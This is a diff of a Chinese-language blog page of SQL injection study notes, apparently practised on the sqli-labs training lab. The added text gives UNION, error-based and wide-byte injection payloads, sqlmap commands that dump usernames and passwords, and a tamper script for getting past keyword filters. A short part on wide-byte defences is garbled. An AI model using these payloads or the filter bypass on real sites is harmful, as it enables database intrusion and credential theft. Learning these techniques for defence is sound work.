@@ -58,7 +58,7 @@
 
         <div class="article-meta">
           <a href="/2023/12/18/9.1-sql%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time datetime="2023-12-18T06:47:33.000Z" itemprop="datePublished">2023-12-18</time>
+  <time datetime="2023-12-18T06:46:51.464Z" itemprop="datePublished">2023-12-18</time>
 </a>
           
           
@@ -67,7 +67,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句"></a>sql语句</h3><p>PS：mysql已经安装好了</p>
+        <h3 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h3><p>常见<em>SQL注入</em>类型（细分七种类型） · 联合注入 · 布尔盲注 · 时间盲注 · 宽字节注入 · 报错注入 · 堆叠注入 · 二次注入.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection(布尔型注入)</span><br><span class="line">E: Error-based SQL injection(报错型注入)</span><br><span class="line">U: UNION query sQL injection(可联合查询注入)</span><br><span class="line">S: Stacked queries sQL injection(可多语句查询注入)</span><br><span class="line">T: Time-based blind sQL injection(基于时间延迟注入</span><br></pre></td></tr></table></figure>
+
+<h3 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句"></a>sql语句</h3><p>PS：mysql已经安装好了</p>
 <h5 id="进入mysql："><a href="#进入mysql：" class="headerlink" title="进入mysql："></a>进入mysql：</h5><p>进入命令行窗口：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ....\MySQL版本号\bin # 进入MySQL根目录下的bin目录</span><br></pre></td></tr></table></figure>
 
@@ -215,7 +218,7 @@ schemata表 - 存储所有数据库名
 <p>表示注释</p>
 <p>而使用<code>-- </code>（有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 <code>--+</code> 的方式来闭合，因为<code>+</code>会被解释成空格。</p>
 <p>注释后面的语句不会被执行，我们可以在注释前执行sql语句获取信息。</p>
-<h4 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h4><p><strong>数字型注入点</strong></p>
+<h4 id="sql注入类型-1"><a href="#sql注入类型-1" class="headerlink" title="sql注入类型"></a>sql注入类型</h4><p><strong>数字型注入点</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/users.php?id=1</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 数字型驻点常见的注入语句(Payload)</span><br><span class="line">select * from 表名 where id=1 and 1=1</span><br><span class="line"></span><br><span class="line"># 查询数据库名和版本</span><br><span class="line">id=-1 union select 1,database(),version() --+</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中的表名</span><br><span class="line">id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;) --+</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中指定表名中的列名字段</span><br><span class="line">id=-1 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;) --+</span><br><span class="line"></span><br><span class="line"># 查询指定表中的数据</span><br><span class="line">id=-1 union select 1,database(),(select group_concat(username,&#x27;:&#x27;,password) from secyrity.users) --+  </span><br></pre></td></tr></table></figure>
@@ -306,36 +309,92 @@ schemata表 - 存储所有数据库名
 <h5 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224101324836.png" alt="image-20231224101324836"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+<h5 id="1-floor报错注入"><a href="#1-floor报错注入" class="headerlink" title="1.floor报错注入"></a>1.floor报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224101955130.png" alt="image-20231224101955130"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/a04873f68d674b77846b135fa96f626c.png" alt="img">    </p>
+<h5 id="2-extractvalue报错注入（查询）"><a href="#2-extractvalue报错注入（查询）" class="headerlink" title="2.extractvalue报错注入（查询）"></a>2.extractvalue报错注入（查询）</h5><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string);</span><br></pre></td></tr></table></figure>
+
+<p><strong>第一个参数</strong>：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+<p><strong>第二个参数</strong>：XPath_string (Xpath格式的字符串)</p>
+<p><strong>concat</strong>:返回结果为连接参数产生的字符串。</p>
+<p>原理与updatexml格式相似。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102040340.png" alt="image-20231224102040340"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/9206f3c3e01548488f00e41467443ee9.png" alt="img"></p>
+<h5 id="3-updatexml报错注入（修改）"><a href="#3-updatexml报错注入（修改）" class="headerlink" title="3.updatexml报错注入（修改）"></a>3.updatexml报错注入（修改）</h5><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br></pre></td></tr></table></figure>
+
+<p><strong>第一个参数</strong>：XML_document是<strong>String格式</strong>，为XML文档对象的名称</p>
+<p><strong>第二个参数</strong>：XPath_string (<strong>Xpath格式的字符串</strong>)</p>
+<p>​		 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/XPath/5574064">XPath</a>即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的语言。</p>
+<p><strong>第三个参数</strong>：new_value，<strong>String格式</strong>，替换查找到的符合条件的数据 </p>
+<p>原理：</p>
+<p>**由于updatexml的第二个参数需要   <strong>Xpath格式</strong>的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。  **</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102115408.png" alt="image-20231224102115408"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/bb85279b4fbc4de6921bf0859954f919.png" alt="img">    </p>
+<h5 id="4-geometrycollection报错注入"><a href="#4-geometrycollection报错注入" class="headerlink" title="4.geometrycollection报错注入"></a>4.geometrycollection报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102149354.png" alt="image-20231224102149354"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/a4ee464fd7dd48ee88b7faa0c5385600.png" alt="img">    </p>
+<h5 id="5-multipoint报错注入"><a href="#5-multipoint报错注入" class="headerlink" title="5.multipoint报错注入"></a>5.multipoint报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102214772.png" alt="image-20231224102214772"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/e3b9d9b17dc7488792de7e9af790374a.png" alt="img">    </p>
+<h5 id="6-polygon报错注入"><a href="#6-polygon报错注入" class="headerlink" title="6.polygon报错注入"></a>6.polygon报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102240751.png" alt="image-20231224102240751"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/5cbe6dc8c3fb4378a5009ee5ca0f1ba9.png" alt="img">    </p>
+<h5 id="7-multipolygon报错注入"><a href="#7-multipolygon报错注入" class="headerlink" title="7.multipolygon报错注入"></a>7.multipolygon报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102308793.png" alt="image-20231224102308793"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/13bc800adf0e4c6db905bb62c7066aa6.png" alt="img">    </p>
+<h5 id="8-linestring报错注入"><a href="#8-linestring报错注入" class="headerlink" title="8.linestring报错注入"></a>8.linestring报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102404855.png" alt="image-20231224102404855"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/bcc78f083f5a45f9980261479bf974a6.png" alt="img">    </p>
+<h5 id="9-multilinestring报错注入"><a href="#9-multilinestring报错注入" class="headerlink" title="9.multilinestring报错注入"></a>9.multilinestring报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102433978.png" alt="image-20231224102433978"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/55da9cbcc47148f386419818ec82b166.png" alt="img"></p>
+<h5 id="10-exp报错注入"><a href="#10-exp报错注入" class="headerlink" title="10.exp报错注入"></a>10.exp报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102504654.png" alt="image-20231224102504654"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/3aad1b75884c4256ad3fa54ed5d57d9c.png" alt="img">    </p>
 <h4 id="Postman与sql注入"><a href="#Postman与sql注入" class="headerlink" title="Postman与sql注入"></a>Postman与sql注入</h4><p>进入网站后如果需要使用网站功能进行sql注入可以使用postman进行协助</p>
 <p>进入网站之后直接键盘点击F12，打开开发者工具，选择网络</p>
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224104441076.png" alt="image-20231224104441076"></p>
@@ -449,6 +508,77 @@ schemata表 - 存储所有数据库名
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | Dumb     |</span><br><span class="line">| 2  | Angelina |</span><br><span class="line">| 3  | Dummy    |</span><br><span class="line">| 4  | secure   |</span><br><span class="line">| 5  | stupid   |</span><br><span class="line">| 6  | superman |</span><br><span class="line">| 7  | batman   |</span><br><span class="line">| 8  | admin    |</span><br><span class="line">| 9  | admin1   |</span><br><span class="line">| 10 | admin2   |</span><br><span class="line">| 11 | admin3   |</span><br><span class="line">| 12 | dhakkan  |</span><br><span class="line">| 14 | admin4   |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure>
 
 <p>表的数据就可以直观的展示出来了</p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p> 原理：mysql在使用 GBK 编码的时候，会认为两个字符为一个汉字，			例如%aa%5c 就是一个汉字（前一个ascii码大于128才能到汉			字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将’ 转换			为 &#39;</p>
+<p>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：<br>        1、%df 吃掉 \ 具体的原因是 urlencode(‘) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形<br>成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>        2、将&#39;中的\过滤掉，例如可以构造%**%5c%5c%27的情况，后面的%5c会被前面的%5c<br>给注释掉。这也是bypass的一种方法。<br>例子： Less-32，33，34，35，36，37 </p>
+<p>​		1.正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的’，就会被转义为&#39;;<br>​       2.若存在宽字节注入，输入%df%27时，经过单引号的转义变成了%df%5c%27，之后再数据库查询语句进行GBK多字节编码，即一个中文占用两个字节，一个英文同样占用两个字节且在汉字编码范围内两个编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成汉字”運”,单引号逃逸出来，从而绕过转义造成注入漏洞</p>
+<p>MySQL在使用GBK编码时，两个字符组合，认为是一个汉字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	西欧字母符号，通过1个字节来表示。东亚字符通过至少两个字节来表示。GBK编码就是用两个字节来表示中文区字符的一个编码标准。</span><br><span class="line">	GBK编码依然采用双字节编码方案，其编码范围∶8140一FEFE(高字节从81到FE，低字节从40到FE)，剔除xx7F码位，共23940个码位。</span><br><span class="line">条件</span><br><span class="line">	后台使用GBK编码的时候，存在着看不见的ascii码转换为GBK编码的转换过程，可以使用宽字节注入。</span><br><span class="line">原理</span><br><span class="line">编码转换存在着单字符被合并的情形</span><br><span class="line">反斜杠对应url编码%5c，是单字节的。</span><br><span class="line">在%5c前再加入一个单字节字符%dd（范围可以是81到FE之间)，就成了%dd%5cI</span><br><span class="line">而当后端使用GBK编码的时候，会将合理的两个单字节ANSCII字符解析成一个双字节的GBK编码字符</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df’-&gt;%df’-&gt; %df%5c%27(%df%5c是一个汉字)-&gt;(汉字)‘-&gt;id=(汉字)’ and (可以注入)</span><br></pre></td></tr></table></figure>
+
+<p>实操：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-32/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227193736656.png" alt="image-20231227193736656"></p>
+<p>输入1‘网页实际输出的却是1&#39;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p>试过各种后缀都无法正常报错，</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227194144122.png" alt="image-20231227194144122"></p>
+<p>这时候便可以用到%df</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227193958466.png" alt="image-20231227193958466"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=1%df&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227195143032.png" alt="image-20231227195143032"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=-1%df&#x27; union select 1,database(),3-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-32/?id=-1%df%27%20union%20select%201,database(),3--%20-</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227201951425.png" alt="image-20231227201951425"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=-1%df&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227203539322.png" alt="image-20231227203539322"></p>
+<p>2.宽字节注入防御方法</p>
+<p>（1）使用utf-8，避免宽字节注入；<br>ps:不仅在gbk,韩文，日文等等都是快字节注入漏洞</p>
+<p>（2）mysql_real_escape_string,mysql_set_charset(‘gbk,conn′);3.可以设置参数，charactersetclient&#x3D;binary只需在该语句中插入conn’);</p>
+<p>（3）可以设置参数，character_set_client&#x3D;binary只需在该语句中插入conn′);3.可以设置参数，charactersetclient&#x3D;binary只需在该语句中插入result&#x3D;mysql_query($sql)即可<br>result&#x3D;mysqlquery(“charactersetclient&#x3D;binary”,result&#x3D;mysql_query(“character_set_client&#x3D;binary”,result&#x3D;mysqlquery(“charactersetclient&#x3D;binary”,sql);&#x2F;&#x2F;就不会出现宽字节注入</p>
+<h5 id="宽字节与sqlmap"><a href="#宽字节与sqlmap" class="headerlink" title="宽字节与sqlmap"></a>宽字节与sqlmap</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1”</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df”</span><br><span class="line">python sqlmap.py -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” --current-user</span><br><span class="line">python sqlmap.py -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” --current-db（查数据库）</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security --tables(当前数据库有哪些表)</span><br><span class="line"></span><br><span class="line">(当前表中有哪些字段)</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security -T users --column</span><br><span class="line"></span><br><span class="line">(当前表中有哪些数据)</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security -T users -C username,password --dump（使用dump来获取内容）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="其他注入sql演示"><a href="#其他注入sql演示" class="headerlink" title="其他注入sql演示"></a>其他注入sql演示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,(select concat(1,2,3)),3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227204444058.png" alt="image-20231227204444058"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select 4,5,6;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227205052633.png" alt="image-20231227205052633"></p>
+<p>参数重复注入，网站选择情况</p>
+<p><img src="/9.1-sql%E6%B3%A8%E5%85%A5.assets/image-20231227144128736.png" alt="image-20231227144128736"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-1/?id=1&amp;id=2&amp;id=3&amp;id=4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227205323912.png" alt="image-20231227205323912"></p>
+<p>php表示默认选择最后的参数。</p>
+<h5 id="sqlmap的tamper编写"><a href="#sqlmap的tamper编写" class="headerlink" title="sqlmap的tamper编写"></a>sqlmap的tamper编写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;or&#x27;</span> , <span class="string">&#x27;oorr&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;and&#x27;</span> , <span class="string">&#x27;anandd&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27; &#x27;</span> , <span class="string">&#x27;%0B&#x27;</span>)</span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>将该temper文件拖进kali中，放在&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v 3 --tamper=trrr --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/45adb2ac02c9d623f7d0447188f2301.png" alt="45adb2ac02c9d623f7d0447188f2301"></p>
+<p>成功显示</p>
+<h4 id="Oracle数据库sql注入"><a href="#Oracle数据库sql注入" class="headerlink" title="Oracle数据库sql注入"></a>Oracle数据库sql注入</h4><p>空格需要使用+代替</p>
+<p>Oracle数据库注入时的字符需要有三个字符如abc，def</p>
